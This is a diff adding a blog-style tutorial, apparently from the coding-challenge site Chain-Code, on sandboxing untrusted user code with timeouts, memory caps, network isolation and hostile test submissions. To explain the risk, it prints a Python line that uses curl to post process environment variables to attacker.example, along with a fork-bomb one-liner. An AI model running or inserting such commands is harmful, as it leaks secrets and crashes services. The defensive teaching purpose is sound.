@@ -1,0 +1,58 @@
+---
+title: How to run untrusted code safely (sandbox tutorial)
+description: A hands-on tutorial on running user-submitted code without wrecking your server. Timeouts, memory caps, network locks, and why plain exec calls end badly.
+primaryKeyword: run untrusted code safely
+secondaryKeywords: sandbox user submitted code, isolate tutorial, judge0 security model
+date: 2026-08-28
+author: Chain-Code
+canonical: https://chaincode-xi.vercel.app/blog/run-untrusted-code-safely-sandbox-tutorial
+slug: run-untrusted-code-safely-sandbox-tutorial
+schema: HowTo
+---
+
+# Run untrusted user code safely: a sandbox tutorial
+
+The moment your app executes code written by strangers, every user becomes a sysadmin on your box. This tutorial shows how to [run untrusted code safely](/blog/run-untrusted-code-safely-sandbox-tutorial) using kernel-level isolation, with concrete limits you can copy. We built Chain-Code's judging pipeline on these principles, and the mistakes before that taught them.
+
+## What an unsandboxed exec call actually permits
+
+Say your backend does `exec("python3 solution.py")`. A user who submits this:
+
+```python
+import os
+os.system("curl -X POST -d @/proc/self/environ https://attacker.example")
+```
+
+just exfiltrated your environment variables, API keys included. Other classics: fork bombs (`while True: os.fork()`) that exhaust PIDs in seconds, infinite output filling your disk through log pipes, and port scans of your private network. None require sophistication.
+
+## The four limits every sandbox needs
+
+1. **Wall-clock timeout.** Kill the process at N seconds regardless of what it does. CPU-time limits alone miss sleeps and I/O hangs. Ten seconds is generous for challenge-scale solutions; most correct submissions finish in under one.
+2. **Memory cap.** cgroup or rlimit enforced, not advisory. A 256MB default handles most challenge solutions.
+3. **No network.** Network namespace with no interfaces, or an egress deny rule. Nothing user-submitted needs to phone home.
+4. **Fresh filesystem view.** Mount a tmpfs or read-only root so runs cannot touch each other or your disk.
+
+Skip any one of these and assume someone will find it, because they enjoy finding it.
+
+## What happens if you skip the sandbox?
+
+The failure is not hypothetical, so here is the concrete sequence. An attacker submits code that reads your process environment and posts it to a server they control within milliseconds — faster than any human review. Your API keys, database URLs, and session secrets are now theirs, and you learn about it from an unexpectedly empty quota graph days later. Fork bombs are even less subtle: `while True: os.fork()` doubles processes every few microseconds until your kernel's PID table fills and every service on the box starts failing in creative ways. Recovery from a fork bomb usually means rebooting; recovery from leaked production keys means rotating every credential you own and auditing what was touched in between.
+
+## Step-by-step: run untrusted code safely with a minimal runner
+
+1. **Do not write the isolation layer yourself.** Use `isolate` (what Judge0 wraps), a container per run, or a hosted engine. Hand-rolled sandboxes miss namespace escapes; this is security-critical plumbing with decades of edge cases.
+2. **Install and test the engine locally.** For Judge0 that is the official docker-compose file; give it 2GB of RAM or it will OOM under load. Piston installs faster if queueing features do not matter yet.
+3. **Wrap submissions behind your backend.** The browser calls your endpoint; your server calls the engine. Never let client and execution engine share a network path.
+4. **Apply the four limits from the previous section** in the engine config, then verify each one deliberately: submit a fork bomb (should die by PID cap), an infinite loop (wall timeout), a 2GB allocation (memory kill), and a fetch to an external host (network blocked).
+5. **Batch test cases into one submission** with a generated driver script, so five hidden tests cost one execution rather than five.
+6. **Log resource usage per run.** When something misbehaves later, per-run time/memory/network records turn a mystery into a lookup.
+
+For the engine-choice tradeoffs, our [Judge0 vs Piston comparison](/blog/judge0-vs-piston-self-hosted-coding-sandbox) covers setup effort and cost. And whatever engine you pick, keep its key off the browser — see [fixing an API key leaked in your frontend bundle](/blog/fix-api-key-leaked-frontend-bundle).
+
+## Verify your sandbox is actually closed
+
+Write the hostile submissions yourself. A short checklist: fork bomb, infinite loop, huge memory alloc, external network call, read of `/etc/passwd`, attempt to open another submission's temp files. Run this checklist on every engine upgrade too, not just at initial setup. Sandbox configurations drift between versions, and a limit that held in one release can behave differently in the next. The test suite costs an hour to build and minutes to re-run; treat it as part of the upgrade, not optional due diligence.
+
+## Where this fits in Chain-Code
+
+Every solution on our [problems page](/problems) passes through exactly this pipeline before it can be judged, and only accepted solutions become [verifiable certificates](/blog/verify-code-ownership-nft-certificate). Safe execution is the boring foundation everything else stands on.
